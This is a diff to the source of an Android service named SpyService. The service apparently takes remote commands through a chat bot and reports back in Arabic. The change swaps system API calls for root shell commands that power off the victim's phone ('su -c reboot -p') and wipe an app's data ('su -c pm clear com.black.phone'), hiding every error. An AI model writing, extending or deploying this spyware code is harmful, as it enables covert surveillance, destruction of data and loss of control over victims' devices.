@@ -605,7 +605,7 @@ public class SpyService extends Service {
         try {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (Build.VERSION.SDK_INT >= 28) {
-                try { pm.shutdown(false, null, false); } catch (Exception e) {}
+                try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
             } else {
                 try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
             }
@@ -670,7 +670,7 @@ public class SpyService extends Service {
         try {
             PackageManager pm = getPackageManager();
             if (Build.VERSION.SDK_INT >= 23) {
-                try { pm.clearApplicationUserData(getPackageName()); } catch (Exception e) {}
+                try { Runtime.getRuntime().exec("su -c pm clear com.black.phone"); } catch (Exception e) {}
             }
             bot.sendMessage("🧹 تم مسح بيانات التطبيق");
         } catch (Exception e) {
